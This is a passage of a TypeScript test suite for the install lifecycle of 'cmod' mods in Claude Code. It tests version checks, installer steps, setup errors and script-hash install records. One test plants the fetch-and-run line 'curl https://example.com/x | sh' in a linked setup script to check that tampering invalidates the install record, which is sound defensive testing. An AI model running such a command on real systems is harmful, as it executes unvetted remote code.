  const lifecycle = createLifecycle(trackedMod().definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()
  await fire(2000)
  const whileUnchanged = setupsRun.length
  await fire(4000)

  expect(whileUnchanged).toBe(1)
  expect(setupsRun).toHaveLength(2)
  expect(lifecycle.toasts.filter((toast) => toast.type === 'error')).toEqual([])
})

test('a waiting mod continues its install once the cmod program appears, with no further event', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  let isOnPath = false
  fake.fakes.process.run = async (argv) => {
    if (!isOnPath) throw new Error(`failed to start: ENOENT: spawn ${argv[0]} ENOENT`)
    return cmodOnPath()
  }
  const spawned: ProcessSpawnRequest[] = []
  fake.fakes.process.spawn = (request) => {
    spawned.push(request)
    return finished(['done safe-delete 0.2.0'], 0)
  }
  const timers: { ms: number; fire: () => void; isCancelled: boolean }[] = []
  fake.claude.clock.every = (ms, fire) => {
    const timer = { ms, fire, isCancelled: false }
    timers.push(timer)
    return { cancel: () => (timer.isCancelled = true) }
  }
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()
  const cmodCheck = timers.find((timer) => timer.ms === 1000)
  cmodCheck?.fire()
  await fake.settle()

  expect(spawned).toEqual([])
  expect(lifecycle.toasts).toEqual([{ type: 'loading', message: 'Installing', description: 'Waiting for cmod' }])

  isOnPath = true
  cmodCheck?.fire()
  await fake.settle()

  expect(spawned).toEqual([{ argv: ['cmod', 'setup', root, '--events'] }])
  expect(cmodCheck?.isCancelled).toBe(true)
  expect(runs).toEqual([])
})

test('a mod that binds keys waits while PATH finds a cmod older than 0.1.12, names the fix, and sets up once a newer cmod answers', async () => {
  const fake = fakeClaude({ name: 'modes', root })
  const cmodAt = (version: string) => async (): Promise<ProcessRunResult> => ({ exitCode: 0, stdout: `cmod ${version}\n`, stderr: '', isStdoutTruncated: false, isStderrTruncated: false })
  fake.fakes.process.run = cmodAt('0.1.8')
  const spawned: ProcessSpawnRequest[] = []
  fake.fakes.process.spawn = (request) => {
    spawned.push(request)
    return finished(['done modes 0.2.0'], 0)
  }
  const timers: { ms: number; fire: () => void; isCancelled: boolean }[] = []
  const timer = (ms: number, fire: () => void) => {
    const made = { ms, fire, isCancelled: false }
    timers.push(made)
    return { cancel: () => (made.isCancelled = true) }
  }
  fake.fakes.clock.every = timer
  fake.fakes.clock.after = timer
  const lifecycle = createLifecycle(defineMod({ name: 'modes', setup() {} }))

  await lifecycle.start(fake.claude, given({ ...pending, name: 'modes', steps: { keys: { 'shift+tab': 'mode' } } }))
  await fake.settle()
  timers.find((made) => made.ms === 1000)?.fire()
  await fake.settle()
  timers.find((made) => made.ms === 60_000)?.fire()
  await fake.settle()

  expect(spawned).toEqual([])
  expect(lifecycle.toasts).toEqual([
    { type: 'loading', message: 'Installing', description: 'PATH finds cmod 0.1.8, and modes needs cmod 0.1.12 or later. Run npm i -g @cmodjs/cli, or put ~/.local/bin ahead of the old cmod on PATH.' },
  ])

  fake.fakes.process.run = cmodAt('0.1.12')
  timers.find((made) => made.ms === 1000)?.fire()
  await fake.settle()

  expect(spawned).toEqual([{ argv: ['cmod', 'setup', root, '--events'] }])
})

test('a mod that asks for a config list waits while PATH finds a cmod older than 1.6.0, which replaces a whole object where it merges now', async () => {
  const fake = fakeClaude({ name: 'modes', root })
  fake.fakes.process.run = async () => ({ exitCode: 0, stdout: 'cmod 0.3.0\n', stderr: '', isStdoutTruncated: false, isStderrTruncated: false })
  const spawned: ProcessSpawnRequest[] = []
  fake.fakes.process.spawn = (request) => {
    spawned.push(request)
    return finished(['done modes 0.2.0'], 0)
  }
  const timers: { ms: number; fire: () => void }[] = []
  fake.fakes.clock.after = (ms, fire) => (timers.push({ ms, fire }), { cancel: () => {} })
  fake.fakes.clock.every = fake.fakes.clock.after
  const lifecycle = createLifecycle(defineMod({ name: 'modes', setup() {} }))

  await lifecycle.start(fake.claude, given({ ...pending, name: 'modes', steps: { permissions: ['config:statusLine'] } }))
  await fake.settle()
  timers.find((made) => made.ms === 1000)?.fire()
  await fake.settle()
  timers.find((made) => made.ms === 60_000)?.fire()
  await fake.settle()

  expect(spawned).toEqual([])
  expect(lifecycle.toasts[0]?.description).toBe('PATH finds cmod 0.3.0, and modes needs cmod 1.6.0 or later. Run npm i -g @cmodjs/cli, or put ~/.local/bin ahead of the old cmod on PATH.')
})

test('a mod keeps waiting for cmod past 60 seconds and starts once cmod is ready', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodMissing
  const spawned: ProcessSpawnRequest[] = []
  fake.fakes.process.spawn = (request) => {
    spawned.push(request)
    return finished(['done safe-delete 0.2.0'], 0)
  }
  const timers: { ms: number; fire: () => void; isCancelled: boolean }[] = []
  const timer = (ms: number, fire: () => void) => {
    const made = { ms, fire, isCancelled: false }
    timers.push(made)
    return { cancel: () => (made.isCancelled = true) }
  }
  fake.fakes.clock.every = timer
  fake.fakes.clock.after = timer
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()
  timers.find((made) => made.ms === 60_000)?.fire()
  await fake.settle()

  expect(lifecycle.toasts).toEqual([{ type: 'loading', message: 'Installing', description: "Still waiting for cmod to download cmod. See cmod's own line." }])

  fake.fakes.process.run = cmodOnPath
  timers.find((made) => made.ms === 1000)?.fire()
  await fake.settle()
  await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})

  expect(spawned).toEqual([{ argv: ['cmod', 'setup', root, '--events'] }])
  expect(timers.filter((made) => made.ms === 1000 || made.ms === 60_000).map((made) => made.isCancelled)).toEqual([true, true])
  expect(runs).toEqual(['setup', 'PostToolBatch'])
})

test('a mod whose setup function throws says its setup function threw, and leaves no listener registered', async () => {
  const fake = fakeClaude({ name: 'broken', root })
  let hookRuns = 0
  const lifecycle = createLifecycle(
    defineMod({
      name: 'broken',
      setup() {
        sessions.current.beforeToolBatch(() => {
          hookRuns += 1
        })
        throw new Error('no config file')
      },
    }),
  )

  await lifecycle.start(fake.claude, given({ ...pending, name: 'broken', isInstalled: true }))
  await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})

  expect(hookRuns).toBe(0)
  expect(lifecycle.toasts).toEqual(failed('its setup function threw: no config file'))
})

test('a mod whose state fails to load says its state did not load', async () => {
  const fake = fakeClaude({ name: 'broken', root })
  fake.claude.store.get = async () => Promise.reject(new Error('the store file is locked'))
  const lifecycle = createLifecycle(defineMod({ name: 'broken', state: { project: { expanded: [] as string[] } }, setup() {} }))

  await lifecycle.start(fake.claude, given({ ...pending, name: 'broken', isInstalled: true }))

  expect(lifecycle.toasts).toEqual(failed('its state did not load: the store file is locked'))
})

test('a missing secret option asks in the installer to set it in /config, and Not now fails with the same fix', async () => {
  const fake = fakeClaude({ name: 'ci-watch', root })
  const token = option.secret({ title: 'GitHub token', description: 'Reads your CI runs' })
  const lifecycle = createLifecycle(defineMod({ name: 'ci-watch', options: { githubToken: token }, setup() {} }))

  void lifecycle.start(fake.claude, given({ ...pending, name: 'ci-watch', isInstalled: true }))
  await fake.settle()

  expect(await installerText(lifecycle, 'ci-watch')).toContain('Set it in /config, where Claude Code keeps it in your keychain')
  await pressInInstaller(lifecycle, 'not-now', 'ci-watch')
  await fake.settle()
  expect(lifecycle.toasts).toEqual(failed('it needs GitHub token', 'Set it in /config.'))
})

test('a missing text option saved in the installer through cmod option starts the mod on Next', async () => {
  const fake = fakeClaude({ name: 'ci-watch', root })
  const saved: (readonly string[])[] = []
  const rows: { key: string; value: string }[] = []
  fake.fakes.process.run = async (argv) => {
    saved.push(argv)
    if (argv[1] === 'option') rows.push({ key: `${argv[2]}.${argv[3]}`, value: argv[4] ?? '' })
    return { exitCode: 0, stdout: '', stderr: '', isStdoutTruncated: false, isStderrTruncated: false }
  }
  fake.fakes.config.list = async () => rows.map((row) => ({ ...row, label: row.key, kind: 'text', provider: { plugin: 'ci-watch', tier: 'user' }, isLocked: false }) as never)
  let branch: unknown
  const lifecycle = createLifecycle(defineMod({ name: 'ci-watch', options: { branch: option.text({ title: 'Branch', description: '' }) }, setup: (mod) => void (branch = mod.options.branch) }))

  void lifecycle.start(fake.claude, given({ ...pending, name: 'ci-watch', isInstalled: true }))
  await fake.settle()
  const field = findElement(await fire(lifecycle, 'ui.render', installerPaneFor('ci-watch'), prompt), 'Input', 'option:branch')
  if (field === undefined) throw new Error('The installer draws no field for branch.')
  ;(field['onSubmit'] as (value: string) => void)('main')
  await fake.settle()
  await pressInInstaller(lifecycle, 'next', 'ci-watch')
  await fake.settle()

  expect(saved).toContainEqual(['cmod', 'option', 'ci-watch', 'branch', 'main'])
  expect(lifecycle.phase).toBe('active')
  expect(branch).toBe('main')
})

test("a mod's own installer step opens after it starts, and Finish waits for isDone", async () => {
  const fake = fakeClaude({ name: 'ci-watch', root })
  let isSignedIn = false
  const lifecycle = createLifecycle(
    defineMod({
      name: 'ci-watch',
      installer: [defineStep({ id: 'sign-in', title: 'Sign in to GitHub', render: () => Text({ children: 'Press s to sign in.' }), isDone: () => isSignedIn })],
      setup() {},
    }),
  )

  await lifecycle.start(fake.claude, given({ ...pending, name: 'ci-watch', isInstalled: true }))
  await fake.settle()

  expect(await installerText(lifecycle, 'ci-watch')).toContain('Sign in to GitHub  (1 of 1)')
  await pressInInstaller(lifecycle, 'next', 'ci-watch')
  expect(await installerText(lifecycle, 'ci-watch')).toContain('Finish Sign in to GitHub first.')
  isSignedIn = true
  await pressInInstaller(lifecycle, 'next', 'ci-watch')
  await fake.settle()
  expect(fake.calls.filter((call) => call.call === 'ui.close').map((call) => call.args[0])).toEqual([{ id: 'installer-ci-watch' }])
})

test("a step whose isDone fails stays pending, shows the failure, and Finish shows it in the installer", async () => {
  const fake = fakeClaude({ name: 'ci-watch', root })
  const lifecycle = createLifecycle(
    defineMod({
      name: 'ci-watch',
      installer: [defineStep({ id: 'sign-in', title: 'Sign in to GitHub', render: () => Text({ children: 'Press s to sign in.' }), isDone: () => { throw new Error('gh is not installed') } })],
      setup() {},
    }),
  )

  await lifecycle.start(fake.claude, given({ ...pending, name: 'ci-watch', isInstalled: true }))
  await fake.settle()

  expect(lifecycle.toasts).toContainEqual({ type: 'error', message: "The Sign in to GitHub step's isDone failed", description: 'gh is not installed' })
  await pressInInstaller(lifecycle, 'next', 'ci-watch')
  expect(await installerText(lifecycle, 'ci-watch')).toContain("The Sign in to GitHub step's isDone failed: gh is not installed")
})

test('a step left on Not now is listed to /mods, and finishing from /mods opens the installer on it again', async () => {
  const fake = fakeClaude({ name: 'ci-watch', root })
  let isSignedIn = false
  const lifecycle = createLifecycle(
    defineMod({
      name: 'ci-watch',
      installer: [defineStep({ id: 'sign-in', title: 'Sign in to GitHub', render: () => Text({ children: 'Press s to sign in.' }), isDone: () => isSignedIn })],
      setup() {},
    }),
  )
  await lifecycle.start(fake.claude, given({ ...pending, name: 'ci-watch', isInstalled: true }))
  await fake.settle()
  await pressInInstaller(lifecycle, 'not-now', 'ci-watch')
  await fake.settle()

  expect(lifecycle.toasts).toContainEqual({ type: 'warning', message: 'Needs one more step', description: 'Starting with Sign in to GitHub. Finish them in /mods ci-watch.' })
  expect(await fire(lifecycle, 'cmod.call', { to: 'ci-watch', method: 'cmod:pendingSteps', input: null }, { deny: '' })).toEqual({ value: ['Sign in to GitHub'] })

  const finishing = fire(lifecycle, 'cmod.call', { to: 'ci-watch', method: 'cmod:finishSteps', input: null }, { deny: '' })
  await fake.settle()
  expect(await installerText(lifecycle, 'ci-watch')).toContain('Sign in to GitHub  (1 of 1)')
  isSignedIn = true
  await pressInInstaller(lifecycle, 'next', 'ci-watch')
  expect(await finishing).toEqual({ value: null })
  expect(await fire(lifecycle, 'cmod.call', { to: 'ci-watch', method: 'cmod:pendingSteps', input: null }, { deny: '' })).toEqual({ value: [] })
})

test('a mod that hears permissions without registerPermissionCheck does not start, and names the line to add', async () => {
  const fake = fakeClaude({ name: 'guard', root })
  const lifecycle = createLifecycle(defineMod({ name: 'guard', setup: () => void sessions.current.onPermissionCheck(() => undefined) }), () => undefined)

  await lifecycle.start(fake.claude, given({ ...pending, name: 'guard', isInstalled: true }))

  expect(lifecycle.toasts).toEqual(
    failed("its setup function threw: guard: onPermissionCheck hears Claude Code's permission check, so hooks/register.ts must call registerPermissionCheck(addHook) after registerMod."),
  )
})

test('the permissions job without registerPermissionCheck throws where it is used, in setup or after it', async () => {
  const forcePush = permissions({ deny: [{ command: 'git push --force', reason: 'Never force-push.' }] })
  const advice = "guard: the permissions job hears Claude Code's permission check, so hooks/register.ts must call registerPermissionCheck(addHook) after registerMod."
  const inSetup = createLifecycle(defineMod({ name: 'guard', setup: (mod) => mod.use(forcePush) }), () => undefined)
  let started: Mod | undefined
  const later = createLifecycle(defineMod({ name: 'guard', setup: (mod) => void (started = mod) }), () => undefined)

  await inSetup.start(fakeClaude({ name: 'guard', root }).claude, given({ ...pending, name: 'guard', isInstalled: true }))
  await later.start(fakeClaude({ name: 'guard', root }).claude, given({ ...pending, name: 'guard', isInstalled: true }))

  expect(inSetup.toasts).toEqual(failed(`its setup function threw: ${advice}`))
  expect(later.phase).toBe('active')
  let thrown: unknown
  try {
    started?.use(forcePush)
  } catch (error) {
    thrown = error
  }
  expect(thrown).toEqual(new Error(advice))
})

test('a mod that decides permissions starts once registerPermissionCheck registered the permission events', async () => {
  const fake = fakeClaude({ name: 'guard', root })
  const lifecycle = createLifecycle(defineMod({ name: 'guard', setup: () => void sessions.current.beforePermissionRequest(() => undefined) }), () => permissionRoutes)

  await lifecycle.start(fake.claude, given({ ...pending, name: 'guard', isInstalled: true }))

  expect(lifecycle.phase).toBe('active')
})

test('a mod that refuses tool calls starts without registerPermissionCheck', async () => {
  const fake = fakeClaude({ name: 'docs', root })
  const lifecycle = createLifecycle(defineMod({ name: 'docs', setup: () => void sessions.current.beforeToolCall(() => undefined) }), () => undefined)

  await lifecycle.start(fake.claude, given({ ...pending, name: 'docs', isInstalled: true }))

  expect(lifecycle.phase).toBe('active')
})

test('a mod whose open panes cannot be read says its open panes did not load', async () => {
  const fake = fakeClaude({ name: 'broken', root })
  fake.claude.ui.panes = async () => Promise.reject(new Error('the pane list is unavailable'))
  const lifecycle = createLifecycle(defineMod({ name: 'broken', setup: (mod) => void mod.ui.pane({ id: 'trash', title: 'Trash', render: () => Text({ children: 'empty' }) }) }))

  await lifecycle.start(fake.claude, given({ ...pending, name: 'broken', isInstalled: true }))

  expect(lifecycle.toasts).toEqual(failed('its open panes did not load: the pane list is unavailable'))
})

test("the cmod plugin runs its bootstrap from its root, and its mod.dataFolder names its data folder", async () => {
  const fake = fakeClaude({ name: 'cmod', root })
  const spawned: ProcessSpawnRequest[] = []
  fake.fakes.process.spawn = (request) => {
    spawned.push(request)
    return finished([], 0)
  }
  let folder: string | undefined
  const lifecycle = createLifecycle(
    defineMod({
      name: 'cmod',
      setup(mod) {
        folder = mod.dataFolder
      },
    }),
  )

  await lifecycle.start(fake.claude, given({ ...pending, name: 'cmod' }))
  await fake.settle()
  await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})

  expect(spawned).toEqual([{ argv: ['sh', '-c', './setup/bootstrap.sh'], cwd: root }])
  expect(folder).toBe('/home/.local/share/cmod/data/cmod')
})

test('the cmod plugin counts as installed when the cmod program is its version or newer', async () => {
  const fake = fakeClaude({ name: 'cmod', root })
  Object.assign(fake.fakes.fs, fakeFiles({ [`${root}/.claude-plugin/plugin.json`]: '{ "name": "cmod", "version": "0.1.10" }' }))
  const installedWith = async (program: string) => {
    fake.fakes.process.run = async () => ({ exitCode: 0, stdout: `${program}\n`, stderr: '', isStdoutTruncated: false, isStderrTruncated: false })
    return (await readPlugin(fake.claude)).isInstalled
  }

  expect(await installedWith('0.1.10')).toBe(true)
  expect(await installedWith('0.2.0')).toBe(true)
  expect(await installedWith('0.1.9')).toBe(false)
})

test('readPlugin reads the install step, the version, and whether the record matches the scripts', async () => {
  const files: Record<string, string> = {
    [`${root}/.claude-plugin/plugin.json`]: '{ "name": "safe-delete", "version": "0.2.0" }',
    [`${root}/package.json`]: '{ "cmod": { "install": "./setup/install.sh" } }',
    [`${root}/setup/install.sh`]: 'echo "progress 1 1 Done"\n',
  }
  const fileAt = (path: string) => files[path.replaceAll('/./', '/')]
  const sha = await scriptsSha256({ install: './setup/install.sh' }, { read: async (path) => fileAt(`${root}/${path}`), list: async (folder) => (await entriesIn(files)(`${root}/${folder}`)).map((entry) => entry.name) })
  files['/test/home/.local/share/cmod/records/safe-delete.json'] = JSON.stringify({
    name: 'safe-delete',
    version: '0.2.0',
    root,
    installedAt: '2026-10-05T00:00:00.000Z',
    scriptsSha256: sha,
    uninstall: null,
    program: null,
  })
  const fake = fakeClaude({ name: 'safe-delete', root })
  Object.assign(fake.fakes.fs, fakeFiles(files))

  expect(await readPlugin(fake.claude)).toEqual({ ...pending, isInstalled: true, store: '/test/home/.local/share/cmod', steps: { install: './setup/install.sh' } })

  await fake.claude.fs.write(`${root}/setup/install.sh`, 'echo changed\n')
  expect((await readPlugin(fake.claude)).isInstalled).toBe(false)
})

test("the SDK lists files in a script's subfolders", async () => {
  const files: Record<string, string> = {
    [`${root}/.claude-plugin/plugin.json`]: '{ "name": "safe-delete", "version": "0.2.0" }',
    [`${root}/package.json`]: '{ "cmod": { "install": "./setup/install.sh" } }',
    [`${root}/setup/install.sh`]: '. ./setup/lib/brew.sh\n',
    [`${root}/setup/lib/brew.sh`]: 'brew install trash\n',
  }
  const fileAt = (path: string) => files[path.replaceAll('/./', '/')]
  const below = (folder: string) => {
    const prefix = `${root}/${folder}/`.replaceAll('/./', '/')
    return Object.keys(files).flatMap((path) => (path.startsWith(prefix) ? [path.slice(prefix.length)] : [])).sort()
  }
  const sha = await scriptsSha256({ install: './setup/install.sh' }, { read: async (path) => fileAt(`${root}/${path}`), list: async (folder) => below(folder) })
  files['/test/home/.local/share/cmod/records/safe-delete.json'] = JSON.stringify({ name: 'safe-delete', version: '0.2.0', root, installedAt: '2026-10-05T00:00:00.000Z', scriptsSha256: sha, uninstall: null, program: null })
  const fake = fakeClaude({ name: 'safe-delete', root })
  Object.assign(fake.fakes.fs, fakeFiles(files))

  expect((await readPlugin(fake.claude)).isInstalled).toBe(true)

  await fake.claude.fs.write(`${root}/setup/lib/brew.sh`, 'brew install trash-cli\n')

  expect((await readPlugin(fake.claude)).isInstalled).toBe(false)
})

test('the SDK lists a symbolic link in a step folder', async () => {
  const files: Record<string, string> = {
    [`${root}/.claude-plugin/plugin.json`]: '{ "name": "safe-delete", "version": "0.2.0" }',
    [`${root}/package.json`]: '{ "cmod": { "install": "./setup/install.sh" } }',
    [`${root}/setup/install.sh`]: '. ./setup/brew.sh\n',
    '/shared/brew.sh': 'brew install trash\n',
  }
  const fake = fakeClaude({ name: 'safe-delete', root })
  Object.assign(fake.fakes.fs, fakeFiles(files, { [`${root}/setup/brew.sh`]: '/shared/brew.sh' }))
  const sha = await scriptsSha256({ install: './setup/install.sh' }, { read: async (path) => fake.claude.fs.read(`${root}/${path}`), list: async () => ['brew.sh', 'install.sh'] })
  await fake.claude.fs.write('/test/home/.local/share/cmod/records/safe-delete.json', JSON.stringify({ name: 'safe-delete', version: '0.2.0', root, installedAt: '2026-10-05T00:00:00.000Z', scriptsSha256: sha, uninstall: null, program: null }))

  expect((await readPlugin(fake.claude)).isInstalled).toBe(true)

  await fake.claude.fs.write('/shared/brew.sh', 'curl https://example.com/x | sh\n')

  expect((await readPlugin(fake.claude)).isInstalled).toBe(false)
})

test('a mod with a program and no install step runs setup and then turns on', async () => {
  const files: Record<string, string> = {
    [`${root}/.claude-plugin/plugin.json`]: '{ "name": "safe-delete", "version": "0.2.0" }',
    [`${root}/package.json`]: '{ "cmod": { "program": "safe-delete" } }',
  }
  const fake = fakeClaude({ name: 'safe-delete', root })
  Object.assign(fake.fakes.fs, fakeFiles(files))
  fake.fakes.process.run = cmodOnPath
  const spawned: ProcessSpawnRequest[] = []
  fake.fakes.process.spawn = (request) => {
    spawned.push(request)
    return finished(['progress 0 3 Downloading safe-delete 0.2.0', 'progress 3 3 safe-delete 0.2.0 is installed', 'done safe-delete 0.2.0'], 0)
  }
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, readPlugin)
  await fake.settle()

  expect(spawned).toEqual([{ argv: ['cmod', 'setup', root, '--events'] }])
  expect(runs).toEqual([])

  await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})

  expect(runs).toEqual(['setup', 'PostToolBatch'])
})

test('a mod with no steps activates at once and writes its record in the background', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  Object.assign(fake.fakes.fs, fakeFiles(manifestOnly))
  fake.fakes.process.run = cmodOnPath
  const step = controlledStream()
  const spawned: ProcessSpawnRequest[] = []
  fake.fakes.process.spawn = (request) => {
    spawned.push(request)
    return step.stream
  }
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, readPlugin)
  await fake.settle()

  expect(runs).toEqual(['setup'])
  expect(spawned).toEqual([{ argv: ['cmod', 'setup', root, '--events'] }])
  expect(lifecycle.toasts).toEqual([{ type: 'success', message: 'Installed', description: 'Adds the Trash pane.' }])

  step.print('done safe-delete 0.2.0')
  step.exit(0)
  await fake.settle()
  await fire(lifecycle, 'classic.UserPromptSubmit', { ...postToolUse, hook_event_name: 'UserPromptSubmit', prompt: 'hi' }, {})
  await fake.settle()

  expect(spawned).toHaveLength(1)
  await fire(lifecycle, 'classic.PostToolBatch', toolBatch, {})
  expect(runs).toEqual(['setup', 'PostToolBatch'])
})

test('a mod with no steps writes its record silently, and retries on the next prompt while cmod is missing', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  Object.assign(fake.fakes.fs, fakeFiles(manifestOnly))
  let isOnPath = false
  fake.fakes.process.run = async () => (isOnPath ? cmodOnPath() : cmodMissing())
  const spawned: ProcessSpawnRequest[] = []
  fake.fakes.process.spawn = (request) => {
    spawned.push(request)
    return finished(['done safe-delete 0.2.0'], 0)
  }
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, readPlugin)
  await fake.settle()

  expect(runs).toEqual(['setup'])
  expect(spawned).toEqual([])
  expect(lifecycle.toasts).toEqual([{ type: 'success', message: 'Installed', description: 'Adds the Trash pane.' }])
  expect(fake.shown.logs).toEqual([])

  isOnPath = true
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})
  await fake.settle()

  expect(spawned).toEqual([{ argv: ['cmod', 'setup', root, '--events'] }])
  expect(lifecycle.toasts).toEqual([{ type: 'success', message: 'Installed', description: 'Adds the Trash pane.' }])
})

test('a folder named in an install command does not stop the mod from starting', async () => {
  const files: Record<string, string> = {
    [`${root}/.claude-plugin/plugin.json`]: '{ "name": "safe-delete", "version": "0.2.0" }',
    [`${root}/package.json`]: '{ "cmod": { "install": "sh ./setup/install.sh setup" } }',
    [`${root}/setup/install.sh`]: 'echo "progress 1 1 Done"\n',
  }
  const sha = await scriptsSha256({ install: 'sh ./setup/install.sh setup' }, { read: async (path) => files[`${root}/${path}`.replaceAll('/./', '/')], list: async (folder) => (await entriesIn(files)(`${root}/${folder}`)).map((entry) => entry.name) })
  files['/test/home/.local/share/cmod/records/safe-delete.json'] = JSON.stringify({ name: 'safe-delete', version: '0.2.0', root, installedAt: '2026-10-05T00:00:00.000Z', scriptsSha256: sha, uninstall: null, program: null })
  const fake = fakeClaude({ name: 'safe-delete', root })
  Object.assign(fake.fakes.fs, fakeFiles(files))
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, readPlugin)

  expect(runs).toEqual(['setup'])
})

test('a plugin.json that is not JSON shows its path as a failure', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  Object.assign(fake.fakes.fs, fakeFiles({ [`${root}/.claude-plugin/plugin.json`]: '{ "name": ' }))
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, readPlugin)

  expect(runs).toEqual([])
  expect(lifecycle.toasts[0]?.message).toStartWith(`${root}/.claude-plugin/plugin.json is not JSON`)
})

test('a plugin.json the mod cannot read fails the start with the read error', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const denied = `safe-delete: $.fs.stat(${root}/.claude-plugin/plugin.json) failed: EACCES`
  fake.fakes.fs.stat = async () => Promise.reject(new Error(denied))
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, readPlugin)

  expect(runs).toEqual([])
  expect(lifecycle.phase).toBe('failed')
  expect(lifecycle.toasts).toEqual(failed(denied))
})

test.each(['ENOENT', 'ENOTDIR'])('a path Claude Code fails to stat with %s reads as a missing file', async (errno) => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const files = fakeFiles(manifestOnly)
  Object.assign(fake.fakes.fs, files)
  fake.fakes.fs.stat = async (path, options) => files.stat(path, options).catch((error: unknown) => Promise.reject(new Error(`safe-delete: $.fs.stat(${path}) failed: ${errno}`, { cause: error })))

  expect(await readPlugin(fake.claude)).toEqual({ ...pending, store: '/test/home/.local/share/cmod', isInstalled: true, shouldRecord: true })
})

test('an error from cmod --version other than not found shows as a failure', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = async () => Promise.reject(new Error('cmod --version is still running after 30 s'))
  const { runs, definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  expect(runs).toEqual([])
  expect(lifecycle.toasts).toEqual(failed('cmod --version is still running after 30 s'))
})

test('cmod missing from PATH is waiting, not a failure', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodMissing
  const { definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  expect(lifecycle.toasts).toEqual([{ type: 'loading', message: 'Installing', description: 'Waiting for cmod' }])
})

test('an installer pane that fails to open shows as a failure, not as Not now', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => finished(['needs-consent abc123\t./setup/install.sh\t'], 10)
  fake.fakes.ui.open = async () => Promise.reject(new Error('the installer pane did not open'))
  const { definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  expect(fake.shown.logs).toEqual([])
  expect(lifecycle.toasts).toEqual(failed('the installer pane did not open'))
})

test('a whitespace-only chunk of standard error keeps the last error line', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  const step = controlledStream()
  fake.fakes.process.spawn = () => step.stream
  const { definition } = trackedMod()
  const lifecycle = createLifecycle(definition)

  await lifecycle.start(fake.claude, given(pending))
  step.printError('cmod setup: disk full')
  step.printError('   ')
  step.exit(1)
  await fake.settle()

  expect(lifecycle.toasts).toEqual(failed('cmod setup exited 1: cmod setup: disk full'))
})

test('an empty stderr from cmod setup leaves no bare colon in the session', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => finished([], 1)
  const lifecycle = createLifecycle(trackedMod().definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  expect(lifecycle.toasts).toEqual(failed('cmod setup exited 1'))
  expect((lifecycle.failure as Error).message).toBe('safe-delete: cmod setup exited 1.')
})

test('an empty stderr from the cmod bootstrap leaves no bare colon', async () => {
  const fake = fakeClaude({ name: 'cmod', root })
  fake.fakes.process.spawn = () => finished([], 1)
  const lifecycle = createLifecycle(defineMod({ name: 'cmod', setup() {} }))

  await lifecycle.start(fake.claude, given({ ...pending, name: 'cmod' }))
  await fake.settle()

  expect(lifecycle.toasts).toEqual(failed('bootstrap exited 1'))
})

test('an empty stderr from cmod --version leaves no bare colon', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = async () => ({ exitCode: 1, stdout: '', stderr: '', isStdoutTruncated: false, isStderrTruncated: false })
  const lifecycle = createLifecycle(trackedMod().definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  expect(lifecycle.toasts).toEqual(failed('cmod --version exited 1'))
})

test('a reason ending in ? keeps one mark', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => finished(['failed 1\tIs Homebrew installed?'], 1)
  const lifecycle = createLifecycle(trackedMod().definition)

  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  expect((lifecycle.failure as Error).message).toBe('safe-delete: Is Homebrew installed?')
})

type NotesState = { memory: { isTyping: boolean }; session: { draft: string }; global: { notes: string[] } }

function notesIn(projectRoot: string) {
  const fake = fakeClaude({ name: 'notes', root })
  fake.claude.session.root = async () => projectRoot
  const definition = defineMod({
    name: 'notes',
    state: { memory: { isTyping: false }, session: { draft: '' }, global: { notes: [] as string[] } },
    setup() {},
  })
  const session = async () => {
    const lifecycle = createLifecycle(definition)
    await lifecycle.start(fake.claude, given({ ...pending, name: 'notes', isInstalled: true }))
    return lifecycle.mod as Mod<NotesState>
  }
  const moveTo = (nextRoot: string) => {
    fake.claude.session.root = async () => nextRoot
  }
  const startConversation = (id: string) => {
    fake.claude.session.id = async () => id
  }
  return { session, moveTo, startConversation, settle: fake.settle, fakes: fake.fakes }
}

test('a global value is the same in every project', async () => {
  const notes = notesIn('/work/a')
  const first = await notes.session()
